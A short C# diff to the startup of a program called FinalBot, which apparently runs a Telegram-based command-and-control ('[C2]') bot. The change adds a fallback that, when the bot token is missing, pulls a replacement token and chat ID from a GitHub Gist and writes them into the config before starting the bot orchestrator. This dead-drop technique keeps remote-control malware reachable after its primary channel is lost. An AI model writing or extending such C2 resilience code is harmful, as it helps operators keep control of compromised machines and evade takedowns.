@@ -39,11 +39,30 @@ namespace FinalBot
                 string token = ConfigManager.Get("BOT_TOKEN");
                 string adminId = ConfigManager.Get("ADMIN_ID");
                 
+                if (string.IsNullOrEmpty(token) || token == "YOUR_TELEGRAM_BOT_TOKEN")
+                {
+                    Logger.Warn("[C2] Primary token missing or invalid. Attempting Gist fallback...");
+                    var fallback = await GistService.GetFallbackConfigAsync();
+                    if (fallback.HasValue)
+                    {
+                        token = fallback.Value.Token;
+                        adminId = fallback.Value.ChatId;
+                        ConfigManager.Set("BOT_TOKEN", token);
+                        ConfigManager.Set("ADMIN_ID", adminId);
+                    }
+                    else
+                    {
+                        Logger.Error("[C2] FATAL: Cannot start bot, no token available.");
+                        return;
+                    }
+                }
+
                 var orchestrator = new BotOrchestrator(token, adminId);
                 await orchestrator.StartAsync();
             }
             catch (Exception ex)
             {
+                Logger.Error("Fatal application error", ex);
                 LogCrash(ex);
             }
         }
